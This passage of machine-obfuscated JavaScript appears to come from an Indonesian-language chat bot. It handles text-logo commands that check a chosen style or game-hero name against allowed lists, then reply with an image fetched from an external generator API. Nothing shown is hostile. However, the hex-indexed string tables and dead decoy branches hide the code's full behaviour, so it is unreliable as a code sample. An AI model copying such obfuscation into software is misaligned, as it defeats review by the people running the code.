_0x1ce978[_0x240d04(0x1df8)],_0x1ce978['BMbvf'],_0x1ce978[_0x240d04(0xc4e)],_0x240d04(0x5c1),_0x1ce978[_0x240d04(0x1f35)],'zuka2',_0x240d04(0xab3),_0x1ce978[_0x240d04(0x1a0d)],_0x1ce978[_0x240d04(0xd06)],_0x1ce978[_0x240d04(0x206d)],_0x1ce978['zjvxl'],_0x1ce978[_0x240d04(0x181d)],_0x1ce978[_0x240d04(0x2cd9)],_0x240d04(0xc57)+_0x240d04(0x9bd),_0x1ce978[_0x240d04(0x4d0)],_0x1ce978['mOief'],_0x1ce978[_0x240d04(0x55d)],_0x1ce978[_0x240d04(0x1618)],_0x1ce978['joNtt'],_0x1ce978[_0x240d04(0x22d4)],_0x240d04(0x12b6),_0x1ce978[_0x240d04(0x2af2)],_0x240d04(0x99e),_0x240d04(0x1001),_0x1ce978[_0x240d04(0x1a21)],_0x240d04(0x664),_0x1ce978[_0x240d04(0x1e71)],_0x1ce978[_0x240d04(0x1574)],_0x1ce978[_0x240d04(0x22b0)],_0x1ce978[_0x240d04(0x2db0)],_0x1ce978['iqsvm'],'qi',_0x240d04(0x13ec),_0x240d04(0x1cc6),_0x240d04(0x1f40),_0x240d04(0x29c1),_0x1ce978[_0x240d04(0x2e99)],'amily2',_0x1ce978[_0x240d04(0xd0)],_0x1ce978[_0x240d04(0x2e4e)],_0x1ce978[_0x240d04(0x1e6b)],_0x1ce978[_0x240d04(0x2d18)],_0x1ce978[_0x240d04(0x19a5)],_0x240d04(0x2382),_0x1ce978['SyZkv'],_0x240d04(0x213d),_0x240d04(0xb41),_0x1ce978[_0x240d04(0x2c75)],_0x1ce978[_0x240d04(0x9e1)],_0x1ce978[_0x240d04(0x1958)],_0x1ce978['xgYQx'],_0x1ce978['EKvXT'],_0x240d04(0x17dc),_0x1ce978[_0x240d04(0x28f1)],_0x240d04(0x841),_0x1ce978[_0x240d04(0x1ff3)],_0x240d04(0x1bf0),_0x1ce978[_0x240d04(0xe57)],_0x1ce978[_0x240d04(0x3aa)],'zill',_0x1ce978[_0x240d04(0xb45)],_0x1ce978['tHoGS'],_0x240d04(0x2253),'aleister',_0x1ce978['dgzvc'],'annette2',_0x1ce978[_0x240d04(0x99b)],_0x1ce978[_0x240d04(0x2b11)],_0x1ce978[_0x240d04(0x1a61)],_0x1ce978[_0x240d04(0x2ca9)],_0x1ce978['rUyRe'],_0x1ce978[_0x240d04(0xc71)],'fennik',_0x240d04(0x19e0),_0x1ce978[_0x240d04(0x1fe8)],_0x1ce978[_0x240d04(0x2a92)],_0x1ce978[_0x240d04(0x95d)],_0x1ce978[_0x240d04(0x2ea)],'kahlii','mganga',_0x1ce978[_0x240d04(0x788)],_0x1ce978[_0x240d04(0x2d05)],_0x1ce978[_0x240d04(0x2882)],_0x240d04(0x2de9),_0x1ce978['LvRpz'],_0x1ce978['lfDDc'],_0x1ce978[_0x240d04(0x2493)],_0x1ce978[_0x240d04(0xf3)],_0x1ce978[_0x240d04(0x286)],_0x1ce978[_0x240d04(0x18f0)],_0x1ce978[_0x240d04(0x1f5a)],_0x240d04(0x28aa),_0x1ce978[_0x240d04(0xcf9)],_0x1ce978[_0x240d04(0x241d)],_0x1ce978['dKjzp'],_0x240d04(0x1326),_0x1ce978[_0x240d04(0x11bd)],_0x1ce978[_0x240d04(0x2a9d)],_0x1ce978['QKBuE'],_0x240d04(0x20fa),_0x240d04(0x21f),_0x1ce978['gjViR'],_0x1ce978['KVfFt'],_0x1ce978[_0x240d04(0x1ac8)],_0x1ce978['vbYaK'],_0x1ce978[_0x240d04(0x12ce)],_0x1ce978[_0x240d04(0x1e8b)],_0x1ce978['vabeF'],_0x1ce978['xDPas'],_0x1ce978[_0x240d04(0x29ab)],_0x240d04(0xc14),_0x240d04(0x1e94),_0x1ce978[_0x240d04(0x1095)],_0x1ce978['FWecD'],_0x1ce978['RMyfD'],_0x1ce978['FtjzM'],'wukong','nakroth'];if(!_0x29f2b6[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0xd4f)]===_0x1ce978['KbDiO']?_0x2ae9b8+=_0x1ce978[_0x240d04(0x6be)](_0x240d04(0x1f93)+_0x51ec29[_0x8d1fe3],'`\x0a'):_0x1ce978['EIJNA'](_0x555a99,_0x29f2b6,_0x29f2b6[_0x240d04(0x2b45)],_0x1ce978['zjFKN']);else{_0x1ce978[_0x240d04(0x2ebc)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x513769=_0x1ce978[_0x240d04(0x1f1f)](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0xc05)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'character':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x225b35=await _0x1ce978['jAxYz'](fetch,_0x513769);if(!_0x225b35['ok'])throw await _0x225b35[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+'hoto']({'url':_0x513769},{'caption':lang['ok']});}}else _0x2b3c60[_0x240d04(0x15e)](_0x3a71b6),_0x1ce978[_0x240d04(0x6b8)](_0x44cd16,'❌\x20Gagal\x20me'+_0x240d04(0x1934)+'.');}break;case _0x1ce978[_0x240d04(0x1622)]:{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1358)](_0x1ec495,_0x3e6565)+(_0x240d04(0x293b)+_0x240d04(0x2164)+'ontoh\x20peng'+_0x240d04(0x796))+_0x1ce978['qwsPR'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x187c)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x13a4)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x293b)+_0x240d04(0x2164)+_0x240d04(0x2000)+_0x240d04(0x796))+_0x1ce978[_0x240d04(0x183e)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x187c)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x5ccb8f=[_0x1ce978[_0x240d04(0x1ee2)],_0x1ce978[_0x240d04(0x1b07)],_0x240d04(0xf3d),_0x1ce978[_0x240d04(0x129e)],_0x1ce978[_0x240d04(0xb51)],_0x1ce978[_0x240d04(0x1513)]];if(!_0x5ccb8f['includes'](_0x83dd4c))_0x1ce978['UAeSs'](_0x555a99,_0x5ccb8f,_0x5ccb8f[_0x240d04(0x2b45)],_0x1ce978['lqTbJ']);else{_0x1ce978['EuxdG'](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x39cbb5=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x17ac)](_0x240d04(0x1dfb)+_0x240d04(0x1d21),_0x3e6565),{'text':_0x2b7b14,'background':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x4367f2=await _0x1ce978[_0x240d04(0x2cdb)](fetch,_0x39cbb5);if(!_0x4367f2['ok'])throw await _0x4367f2[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x39cbb5},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x237d)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x11fa)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['kOTJk'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978['stpzR'](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20aa)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb(_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+'penggunaan'+_0x240d04(0x23fb))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x20aa)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4ef853=[_0x240d04(0x75b),_0x1ce978['vZFUC'],_0x240d04(0xd6),_0x1ce978[_0x240d04(0x28ce)],_0x1ce978['unonF'],_0x240d04(0x1588),_0x240d04(0x1b85),_0x1ce978[_0x240d04(0x27ab)],_0x240d04(0x2342),'style-10',_0x1ce978[_0x240d04(0xc7a)],_0x240d04(0x2987)];if(!_0x4ef853[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x296e)](_0x1ce978[_0x240d04(0x1fa9)],_0x240d04(0x10f))?_0x1ce978['GUFUY'](_0x555a99,_0x4ef853,_0x4ef853[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]):_0x1ce978[_0x240d04(0x2db7)](_0x5399c8,_0x240d04(0x714)+'rintah\x20'+_0x332dca+_0x240d04(0x10ca)+_0x1ce978['PWYYU'](_0x1bd295[_0x240d04(0x2982)][_0x240d04(0x4e6)][_0x240d04(0x25f3)+'ge'],0x1)+(_0x240d04(0xaab)+_0x240d04(0x1f6b)+_0x240d04(0x53f)+'tnya.'));else{if(_0x240d04(0x1f2e)!==_0x240d04(0x1f2e))return _0x1ce978[_0x240d04(0x2b72)](_0x5d4e6a,_0x240d04(0x177b)+_0xee1c75(_0x5644af)+(_0x240d04(0xaff)+'ah\x20mencapa'+'i\x20level\x20ma'+_0x240d04(0x659)));else{_0x1ce978[_0x240d04(0x27b9)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x4f2780=_0x1ce978[_0x240d04(0xa8f)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x18cf)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x240d04(0x23aa)),_0x3ee521=await _0x1ce978[_0x240d04(0xf9c)](fetch,_0x4f2780);if(!_0x3ee521['ok'])throw await _0x3ee521[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x4f2780},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x20f5)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x199d)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+'penggunaan'+_0x240d04(0x23fb))+_0x1ce978['euSyi'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xa4e)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x297c)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978['rxpGm'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xa4e)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x47c33d=[_0x1ce978[_0x240d04(0x1114)],_0x1ce978[_0x240d04(0x144a)],_0x1ce978[_0x240d04(0x376)],_0x1ce978[_0x240d04(0xba6)],_0x1ce978[_0x240d04(0xe2d)],_0x1ce978['HqAup']];if(!_0x47c33d['includes'](_0x83dd4c)){if(_0x1ce978['ORFIO'](_0x1ce978['SUPAP'],_0x1ce978['NdWmN']))return _0x1dc039(_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x13c8)+_0x240d04(0xd01)+_0x240d04(0xea7)+'bayar\x20dend'+_0x240d04(0x254)+_0x240d04(0x1855));else _0x1ce978['aFXiB'](_0x555a99,_0x47c33d,_0x47c33d[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);}else{if(_0x1ce978[_0x240d04(0x1559)](_0x1ce978['wAYmx'],_0x1ce978[_0x240d04(0x29ac)]))return _0x44e9ca(_0x1ce978['iOIVV']);else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x3dad45=_0x1ce978[_0x240d04(0x15f7)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x33155a=await _0x1ce978[_0x240d04(0x27d4)](fetch,_0x3dad45);if(!_0x33155a['ok'])throw await _0x33155a[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x3dad45},{'caption':lang['ok']});}}}break;case _0x1ce978['ztnfe']:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xeaa)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0xb39)](_0x1ec495,_0x3e6565)+(_0x240d04(0x2869)+_0x240d04(0x1b1d)+_0x240d04(0x2b1d)+'naan:\x0a`')+_0x1ce978[_0x240d04(0x1a81)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'nina`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0x1433)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1358)](_0x1ec495,_0x3e6565)+('\x20teks|cham'+'pion`\x0a\x0aCon'+_0x240d04(0x2b1d)+_0x240d04(0x185a))+_0x1ce978[_0x240d04(0x2383)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x20a3)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x53a116=['aleister',_0x240d04(0x647),_0x1ce978[_0x240d04(0x55d)],_0x240d04(0xfef),_0x240d04(0x2db9),_0x1ce978[_0x240d04(0x1ac8)],_0x1ce978[_0x240d04(0xa79)],_0x1ce978[_0x240d04(0x91c)],_0x1ce978['SGRWL'],_0x240d04(0xc6c),_0x1ce978[_0x240d04(0x2cd9)],_0x240d04(0x102b),_0x1ce978[_0x240d04(0x2a53)],'zata',_0x240d04(0x28aa),_0x1ce978[_0x240d04(0x241d)],_0x1ce978[_0x240d04(0x99b)],_0x1ce978[_0x240d04(0x2b11)],_0x1ce978['EhOpQ'],_0x1ce978[_0x240d04(0xae3)],'gildur','gildur',_0x240d04(0xb11),_0x1ce978['IdnKy'],_0x240d04(0x8a2),_0x240d04(0xf24),_0x1ce978[_0x240d04(0x2254)],_0x1ce978[_0x240d04(0x21a5)],_0x240d04(0x1943),_0x1ce978[_0x240d04(0x642)],_0x240d04(0x2253),_0x1ce978[_0x240d04(0xb45)],_0x1ce978[_0x240d04(0x1095)]];if(!_0x53a116[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x171b)](_0x555a99,_0x53a116,_0x53a116[_0x240d04(0x2b45)],_0x240d04(0x2419));else{if(_0x1ce978[_0x240d04(0x178f)](_0x1ce978['LnftB'],_0x1ce978['LnftB'])){_0x1ce978[_0x240d04(0x142b)](_0x476bfb,lang['wait']);let _0x17b640=_0x1ce978[_0x240d04(0x2a4b)](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x17b5)](_0x240d04(0x1dfb)+'o360/',_0x3e6565),{'text':_0x2b7b14,'champion':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x185a83=await fetch(_0x17b640);if(!_0x185a83['ok'])throw await _0x185a83[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0x17b640},{'caption':lang['ok']});}else _0x3bfc5e=_0x49dad8[_0x240d04(0x960)][_0x240d04(0x19ed)]['id'];}}break;case _0x1ce978[_0x240d04(0x262d)]:{if(_0x1ce978[_0x240d04(0x1bdc)]===_0x1ce978[_0x240d04(0x2b28)])_0x4e6dca(_0x16771f,_0x15df55[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x8ca)]);else{if(!_0x33cfb1)return _0x476bfb(_0x240d04(0x2972)+'ntah:\x0a`'+_0x1ce978[_0x240d04(0x18b8)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978['DfcNq'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0xa19)));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0xe10)](_0x476bfb,_0x240d04(0x2972)+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x1561)](_0x1ec495,_0x3e6565)+('\x20teks|logo'+'`\x0a\x0aContoh\x20'+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x1816)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'chicken`'));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x4987c4=[_0x1ce978[_0x240d04(0x2081)],_0x1ce978[_0x240d04(0x2c9f)]];if(!_0x4987c4[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x2dbb)](_0x555a99,_0x4987c4,_0x4987c4[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);else{_0x1ce978[_0x240d04(0xc62)](_0x476bfb,lang['wait']);let _0xa477ad=_0x1ce978['fGhjL'](api,_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x284e)]+_0x3e6565,{'text':_0x2b7b14,'logo':_0x83dd4c},_0x240d04(0x23aa)),_0x3a8f4e=await _0x1ce978[_0x240d04(0x191c)](fetch,_0xa477ad);if(!_0x3a8f4e['ok'])throw await _0x3a8f4e[_0x240d04(0x1d8c)]();_0x23c0de[_0x240d04(0x2705)+_0x240d04(0x39a)]({'url':_0xa477ad},{'caption':lang['ok']});}}}break;case _0x1ce978[_0x240d04(0x1f19)]:{if(_0x1ce978[_0x240d04(0x1acd)](_0x240d04(0x10ae),_0x1ce978[_0x240d04(0x2cfc)]))return _0x1ce978[_0x240d04(0x165b)](_0x193502,_0x240d04(0x14f0)+_0x240d04(0x9ad)+_0x240d04(0x2b5c)+_0x240d04(0x2826)+'anyak\x20pela'+'nggaran!\x0aG'+_0x240d04(0x260)+_0x240d04(0x1c31)+'\x20membayar\x20'+'denda\x20dan\x20'+_0x240d04(0x2e65)+_0x240d04(0xe32));else{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x2dde)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+(_0x1ec495+_0x3e6565)+('\x20teks|logo'+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978['bljcg'](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x411)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['zZKQd'](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+':\x0a`')+_0x1ce978[_0x240d04(0xf64)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+_0x240d04(0x411)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x5aeb6c=[_0x240d04(0x2759),_0x1ce978['sAGWY'],_0x1ce978[_0x240d04(0x102)],_0x1ce978[_0x240d04(0x2f3)],_0x1ce978[_0x240d04(0x1a12)],_0x1ce978['HjaXA']];if(!_0x5aeb6c[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x2c7d)](_0x1ce978['eYTwQ'],_0x1ce978[_0x240d04(0x2b4c)])?_0x1ce978[_0x240d04(0x17a)](_0x555a99,_0x5aeb6c,_0x5aeb6c['length'],_0x1ce978[_0x240d04(0xe67)]):_0x1ce978[_0x240d04(0x18cd)](_0x285a44,_0x994837,_0x12b4a8[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0x2a3c)]);else{if(_0x1ce978['Vroos']===_0x1ce978[_0x240d04(0xedf)]){_0x1ce978[_0x240d04(0xfb8)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x53566d=_0x1ce978[_0x240d04(0x153f)](api,_0x1ce978['WtcHl'],_0x1ce978[_0x240d04(0x2934)](_0x1ce978[_0x240d04(0x284e)],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x40cbe9=await _0x1ce978[_0x240d04(0x23f2)](fetch,_0x53566d);if(!_0x40cbe9['ok'])throw await _0x40cbe9['text']();_0x23c0de['replyWithP'+_0x240d04(0x39a)]({'url':_0x53566d},{'caption':lang['ok']});}else return _0x1ce978['CaogP'](_0x51445c,_0x1ce978[_0x240d04(0x257a)]);}}}break;case _0x1ce978[_0x240d04(0x324)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0xc87)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x2601)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+'penggunaan'+':\x0a`')+_0x1ce978[_0x240d04(0x29d)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+'style-1`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978[_0x240d04(0xfbe)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+'penggunaan'+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x2ee0)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2c13)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x190d36=['style-1',_0x240d04(0x1b49),_0x1ce978['JMfFY'],_0x1ce978[_0x240d04(0x28ce)],_0x1ce978['unonF'],'style-6',_0x1ce978[_0x240d04(0x1524)],_0x1ce978[_0x240d04(0x27ab)],_0x1ce978[_0x240d04(0xb69)],_0x1ce978[_0x240d04(0x1083)],_0x1ce978[_0x240d04(0xc7a)],'style-12',_0x1ce978[_0x240d04(0x2311)],_0x1ce978[_0x240d04(0x1782)],_0x240d04(0x13ba),_0x1ce978[_0x240d04(0x19d1)],_0x1ce978[_0x240d04(0x2e1b)],_0x1ce978[_0x240d04(0x1f21)],_0x1ce978[_0x240d04(0x1826)],_0x1ce978[_0x240d04(0x29cb)],_0x240d04(0xd4c),_0x1ce978['iFnpk'],_0x240d04(0x5f3),_0x1ce978[_0x240d04(0x91f)]];if(!_0x190d36[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x21e6)](_0x1ce978[_0x240d04(0xfcc)],_0x1ce978[_0x240d04(0xfcc)])?(_0x4a22cd(_0x240d04(0xb17)+_0x240d04(0x2a04)+'an:\x20*'+_0x1ce978['NOTMw'](_0x4d7ad3,_0x3aa378)+'*'),delete _0x325802[_0x3b8a75]):_0x555a99(_0x190d36,_0x190d36[_0x240d04(0x2b45)],_0x240d04(0x2117));else{_0x1ce978[_0x240d04(0x2c2c)](_0x476bfb,lang[_0x240d04(0x172a)]);let _0x7d61f9=api(_0x1ce978[_0x240d04(0x44a)],_0x1ce978[_0x240d04(0x53b)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x57b676=await _0x1ce978[_0x240d04(0x13a6)](fetch,_0x7d61f9);if(!_0x57b676['ok'])throw await _0x57b676['text']();_0x23c0de[_0x240d04(0x2705)+'hoto']({'url':_0x7d61f9},{'caption':lang['ok']});}}break;case _0x1ce978['RLfMd']:{if(!_0x33cfb1)return _0x476bfb('Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x325)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+':\x0a`')+(_0x1ec495+_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x411)));if(!_0x33cfb1[_0x240d04(0x55c)]('|'))return _0x1ce978[_0x240d04(0x2375)](_0x476bfb,_0x240d04(0x2972)+'ntah:\x0a`'+(_0x1ec495+_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x161c)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x411)));var _0x58693c=_0x483c03['join']('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c[_0x240d04(0x1c39)]('|')[0x1];const _0x1e710f=[_0x240d04(0x2759),_0x1ce978[_0x240d04(0x28fa)],_0x1ce978['BJvsR'],_0x1ce978[_0x240d04(0x2f3)],_0x1ce978[_0x240d04(0x263e)],_0x1ce978[_0x240d04(0x925)]];if(!_0x1e710f[_0x240d04(0x55c)](_0x83dd4c))_0x1ce978[_0x240d04(0x2275)](_0x1ce978[_0x240d04(0xb9c)],_0x1ce978[_0x240d04(0x3b5)])?_0x1ce978[_0x240d04(0x28f5)](_0x555a99,_0x1e710f,_0x1e710f[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]):_0xe45722(()=>_0x4a863b(_0x50f245[_0x56984c]),_0x1ce978['UyIYi'](_0x1b573b,0x1388));else{_0x1ce978[_0x240d04(0xad6)](_0x476bfb,lang['wait']);let _0x80fc2c=_0x1ce978[_0x240d04(0x15f7)](api,'alfa',_0x240d04(0x1dfb)+'o360/'+_0x3e6565,{'text':_0x2b7b14,'logo':_0x83dd4c},_0x240d04(0x23aa)),_0x430d11=await _0x1ce978[_0x240d04(0x10e5)](fetch,_0x80fc2c);if(!_0x430d11['ok'])throw await _0x430d11[_0x240d04(0x1d8c)]();_0x23c0de['replyWithP'+'hoto']({'url':_0x80fc2c},{'caption':lang['ok']});}}break;case _0x1ce978[_0x240d04(0x39c)]:{if(!_0x33cfb1)return _0x1ce978[_0x240d04(0x230f)](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978[_0x240d04(0x270b)](_0x1ec495,_0x3e6565)+(_0x240d04(0x1a2d)+_0x240d04(0xdcf)+'penggunaan'+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x137e)](_0x1ec495,_0x3e6565)+('\x20NdikzOne|'+'soldier`'));if(!_0x33cfb1['includes']('|'))return _0x1ce978['UITJj'](_0x476bfb,'Kirim\x20peri'+_0x240d04(0xbb4)+_0x1ce978['WDHpL'](_0x1ec495,_0x3e6565)+('\x20teks|logo'+_0x240d04(0xdcf)+_0x240d04(0x2d50)+_0x240d04(0x23fb))+_0x1ce978[_0x240d04(0x11a)](_0x1ec495,_0x3e6565)+(_0x240d04(0x284)+_0x240d04(0x2a86)));var _0x58693c=_0x483c03[_0x240d04(0x86e)]('\x20'),_0x2b7b14=_0x58693c[_0x240d04(0x1c39)]('|')[0x0],_0x83dd4c=_0x58693c['split']('|')[0x1];const _0x3812d1=[_0x1ce978[_0x240d04(0x1e50)],_0x1ce978[_0x240d04(0x2d95)],_0x240d04(0x1929),_0x240d04(0x2e61),_0x1ce978[_0x240d04(0x1d9c)],_0x1ce978[_0x240d04(0x2c9f)],_0x240d04(0xb99),'raccoon',_0x1ce978[_0x240d04(0x2b5e)],_0x1ce978[_0x240d04(0x316)],_0x1ce978['MPPQQ']];if(!_0x3812d1[_0x240d04(0x55c)](_0x83dd4c)){if(_0x1ce978['SpYFk'](_0x1ce978[_0x240d04(0x1c4e)],_0x1ce978['jfLlp']))_0x555a99(_0x3812d1,_0x3812d1[_0x240d04(0x2b45)],_0x1ce978[_0x240d04(0xe67)]);else{let _0x3c5553=_0x37bf6c[_0x4d3caa]||0x0;_0x1ce978[_0x240d04(0x220a)](_0x3c5553,0x0)&&(_0x107e5d+=_0x3c5553*_0x103f88,_0x4bcb3d+='•\x20'+_0x3c5553+'\x20'+_0x1ce978[_0x240d04(0xa01)](_0x4ed9ae,_0x3e34b9)+_0x240d04(0x993)+_0x1ce978[_0x240d04(0x15c4)](_0x3c5553,_0x502ece)[_0x240d04(0x17bf)+_0x240d04(0x1743)]()+'\x0a',_0x490212[_0xc5ce4d]=0x0);}}else{_0x476bfb(lang[_0x240d04(0x172a)]);let _0x3f4cd2=_0x1ce978[_0x240d04(0x1ad4)](api,_0x240d04(0x10a),_0x1ce978[_0x240d04(0x2934)](_0x1ce978['jrCNG'],_0x3e6565),{'text':_0x2b7b14,'logo':_0x83dd4c},_0x1ce978[_0x240d04(0x2536)]),_0x48ec43=await 